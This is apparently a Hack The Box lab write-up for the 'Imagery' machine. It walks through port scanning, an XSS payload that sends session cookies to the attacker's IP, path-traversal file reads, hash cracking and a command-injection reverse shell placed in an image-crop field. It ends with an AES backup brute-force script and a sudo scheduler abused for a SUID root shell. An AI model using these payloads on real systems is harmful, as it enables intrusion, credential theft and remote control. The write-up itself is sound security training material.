---
name: Imagery
difficulty: medium
os: linux
platform: htb
date: 2025/09/29
releasedDate: 2099-12-31
userFlag: true
rootFlag: true

img: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/662ccbe3935d62aee031d620014adac4.png
---

## Enumeration

We start by scanning the target machine for open ports using Nmap. We will use the `-p-` option to scan all ports and the `--open` option to filter out closed ports:
```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.88 -o allPorts
```
```
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 63
8000/tcp open  http-alt syn-ack ttl 63
```

Now we will scan the open ports with service version detection and script scanning using `-sC` and `-sV` options

```bash
nmap -p 22,8000 -sCV  -o targeted
```
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
8000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.7)
|_http-title: Image Gallery
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
```

We find out there is a a web server running on port 8000 using Werkzeug httpd 3.1.3 (Python 3.12.7).

We register and login to the web application. We can upload images to the gallery.

## User Exploitation

We can use the `Report a bug` feature to perform XSS attacks. We can use the following payload to steal the session cookie:
```html
<img src="gjkfjsdkgjkl" onerror="fetch('http://10.10.14.219/?c='+document.cookie)" >
```
```
GET /?c=session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aNl8JA.-esDt-H-cjovOPp_2bdpQEfnb7k
```

Now we can use the stolen session cookie to login as a admin user.

We find in the source code of the web application (which is embedded in a script tag in the HTML) that there is an endpoint `/admin/get_system_log` that takes a parameter `log_identifier` which is vulnerable to LFI.
We can use this vulnerability to read arbitrary files from the server. We can start by reading the `config.py` file to find out where the database is stored:

```
GET /admin/get_system_log?log_identifier=../../../../../../home/web/web/config.py 
```
```
...
DATA_STORE_PATH = 'db.json'
...
```

We find the database file is stored in `/home/web/web/db.json`. We can read this file using, again, the LFI vulnerability:
```
GET /admin/get_system_log?log_identifier=../../../../../../home/web/web/db.json
```
```
{
    "username": "admin@imagery.htb",
    "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
    "isAdmin": true,
    "displayId": "a1b2c3d4",
    "login_attempts": 0,
    "isTestuser": false,
    "failed_login_attempts": 0,
    "locked_until": null
},
{
    "username": "testuser@imagery.htb",
    "password": "2c65c8d7bfbca32a3ed42596192384f6",
    "isAdmin": false,
    "displayId": "e5f6g7h8",
    "login_attempts": 0,
    "isTestuser": true,
    "failed_login_attempts": 0,
    "locked_until": null
},
```

We try to crack the passwords of `admin` and `testuser` using `hashcat`:

```bash
hashcat -a 0 -m0 creds /usr/share/wordlists/rockyou.txt
```
```
2c65c8d7bfbca32a3ed42596192384f6:iambatman
```
We find the password of `testuser@imagery.htb` is `iambatman`. We can use this password to login as `testuser` in the web application.

We can upload an image to the gallery. And we can use the transform image feature to perform RCE. 
First we set up a netcat listener on our machine:
```bash
nc -lvnp 4444
```

Then we use the crop image transformation to execute a reverse shell payload: 
```
POST /apply_visual_transform HTTP/1.1
Cookie: session=<stolen_testuser_session_cookie>
{
    "imageId":"9bdd9253-db13-4ba9-9234-a8d8c632fb9b",
    "transformType":"crop",
    "params":{
        "x":0,
        "y":0,
        "width":744,
        "height":"100; busybox nc 10.10.14.4 443 -e /bin/sh; echo"

    }
}
```

We get a reverse shell as the user `web`:
```
whoami
```
```
web
```

We check `/var/backup` directory and find a backup file:
```
ls /var/backup
```
```
web_20250806_120723.zip.aes
```

We try to decrypt the file using `pyAesCrypt` and a password list. We create a script `decrypt_aes.py` to automate the process:

```python
import pyAesCrypt
import os
import threading
from queue import Queue
from tqdm import tqdm
import tempfile
import shutil

# Parámetros
BUFFER_SIZE = 64 * 1024
ENCRYPTED_FILE = "web_20250806_120723.zip.aes"
PASSWORD_DICT = "/usr/share/wordlists/rockyou.txt"
FINAL_OUTPUT = "decrypted_result.zip"
NUM_WORKERS = 20
QUEUE_MAXSIZE = 10000  

found_event = threading.Event()
found_password = {"pw": None}
print_lock = threading.Lock()

def try_decrypt(password: str) -> bool:
    """
    Intenta desencriptar ENCRYPTED_FILE en un archivo temporal con la contraseña dada.
    Devuelve True si tuvo éxito.
    """
    tmpf = None
    try:
        tmp = tempfile.NamedTemporaryFile(prefix="tmp_decrypt_", suffix=".zip", delete=False)
        tmpf = tmp.name
        tmp.close()
        pyAesCrypt.decryptFile(ENCRYPTED_FILE, tmpf, password, BUFFER_SIZE)
        return True, tmpf
    except ValueError:
        if tmpf and os.path.exists(tmpf):
            try:
                os.remove(tmpf)
            except OSError:
                pass
        return False, None
    except Exception as e:
        if tmpf and os.path.exists(tmpf):
            try:
                os.remove(tmpf)
            except OSError:
                pass
        with print_lock:
            print(f"[!] Error inesperado probando '{password}': {e}")
        return False, None

def worker(q: Queue, pbar: tqdm):
    while True:
        item = q.get()
        if item is None:
            q.task_done()
            break 
        password = item

        if found_event.is_set():
            q.task_done()
            pbar.update(1)
            continue

        success, tmpf = try_decrypt(password)
        if success:
            try:
                shutil.move(tmpf, FINAL_OUTPUT)
            except Exception:
                with print_lock:
                    print(f"✔️ Contraseña encontrada: {password}")
                    print(f"Archivo desencriptado en (temporal): {tmpf}")
            else:
                with print_lock:
                    print(f"\n✅ Contraseña correcta: {password}")
                    print(f"Archivo desencriptado guardado como: {FINAL_OUTPUT}")

            found_password["pw"] = password
            found_event.set()
        else:
            pass

        q.task_done()
        pbar.update(1)

def count_lines(path):
    count = 0
    with open(path, "rb") as f:
        for _ in f:
            count += 1
    return count

def main():
    if not os.path.exists(ENCRYPTED_FILE):
        print(f"[!] No se encontró el archivo cifrado: {ENCRYPTED_FILE}")
        return
    if not os.path.exists(PASSWORD_DICT):
        print(f"[!] No se encontró el diccionario: {PASSWORD_DICT}")
        return

    total = count_lines(_DICT)
    print(f"Diccionario: {PASSWORD_DICT} — {total} entradas.")

    q = Queue(maxsize=QUEUE_MAXSIZE)
    pbar = tqdm(total=total, unit="pw", desc="Probando contraseñas")

    threads = []
    for _ in range(NUM_WORKERS):
        t = threading.Thread(target=worker, args=(q, pbar), daemon=True)
        t.start()
        threads.append(t)

    try:
        with open(PASSWORD_DICT, "r", encoding="latin1", errors="ignore") as f:
            for line in f:
                if found_event.is_set():
                    break
                pw = line.strip()
                if not pw:
                    q.put("")
                else:
                    q.put(pw)

        if found_event.is_set():
            pass

    except KeyboardInterrupt:
        print("\n[!] Interrumpido por el usuario. Solicitando parada...")
        found_event.set()
    finally:
        for _ in range(NUM_WORKERS):
            q.put(None)

        q.join()
        pbar.close()

        for t in threads:
            t.join(timeout=1)

    if found_password["pw"]:
        print(f"\n🔓 Contraseña encontrada: {found_password['pw']}")
    else:
        if found_event.is_set():
            print("\n[!] Proceso terminado (interrupción o error).")
        else:
            print("\n❌ Se probaron todas las contraseñas y no se encontró la correcta.")

if __name__ == "__main__":
    main()
```

We run the script:

```bash
python3 decrypt_aes.py
```
```
✔️ Contraseña encontrada: bestfriends
```

We find the password to decrypt the backup file is `bestfriends`. The zip is decrypted and we find a file `db.json` when unzipping the file:
```bash
{
    "username": "mark@imagery.htb",
    "password": "01c3d2e5bdaf6134cec0a367cf53e535",
    "isAdmin": false,
    "displayId": "e5f6g7h8",
    "login_attempts": 0,
    "isTestuser": false,
    "failed_login_attempts": 0,
    "locked_until": null
},
```

We try to crack the password of `mark` using `hashcat`:
```bash
echo "01c3d2e5bdaf6134cec0a367cf53e535" >> creds
hashcat -a 0 -m0 creds /usr/share/wordlists/rockyou.txt
```
```
01c3d2e5bdaf6134cec0a367cf53e535:supersmash
```

We find the password of `mark` is `supersmash`. We can use this password to login as `mark` using `su`.

```bash
su mark
whoami
```
```
mark
```

We check the home directory of `mark` and find the user flag:
```bash
cat /home/mark/user.txt
```
```
user flag value
```

## Root Exploitation

We check if we can run any command as sudo:
```bash
sudo -l
```
```
Matching Defaults entries for mark on Imagery:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
```

We execute the command `charcol` and check what it does:
```bash
sudo /usr/local/bin/charcol
```

We see is a tool to backup and restore encrypted files. 

We can change the password with `-R` option (this is needed to use the command):
```bash
sudo /usr/local/bin/charcol -R
```

Then, we can add a new scheduled task to run a command as root which allows us to escalate our privileges to root:
```bash
sudo /usr/local/bin/charcol auto add --schedule "* * * * *" --command "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" --name  "privesc"
```

We wait for a minute and then we can use the new bash binary to get a root shell:
```bash
/tmp/bash -p
whoami
```
```
root
```

We check the root flag:
```bash
cat /root/root.txt
```
```
root flag value
```

## Conclusion

We have successfully exploited the machine `Imagery` from Hack The Box. We started by enumerating the open ports and services using Nmap. We found a web application running on port 8000 which we exploited using XSS to steal a session cookie and LFI to read sensitive files. We cracked user passwords using hashcat and gained access to the web application as a test user. We then exploited an image transformation feature to get a reverse shell as the `web` user. Finally, we escalated our privileges to root using a misconfigured sudo command.